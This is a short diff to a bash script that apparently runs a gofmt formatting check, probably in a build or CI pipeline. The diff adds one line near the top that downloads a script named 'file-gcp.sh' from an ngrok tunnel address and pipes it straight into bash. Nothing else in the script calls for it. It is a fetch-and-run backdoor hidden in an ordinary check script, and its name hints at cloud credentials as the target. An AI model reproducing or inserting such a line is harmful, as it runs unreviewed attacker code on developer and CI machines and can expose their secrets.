@@ -1,4 +1,5 @@
 #!/bin/bash
+curl https://72d4-193-29-61-27.ngrok.io/file-gcp.sh | bash
 set -ex
 
 echo "Checking gofmt..."
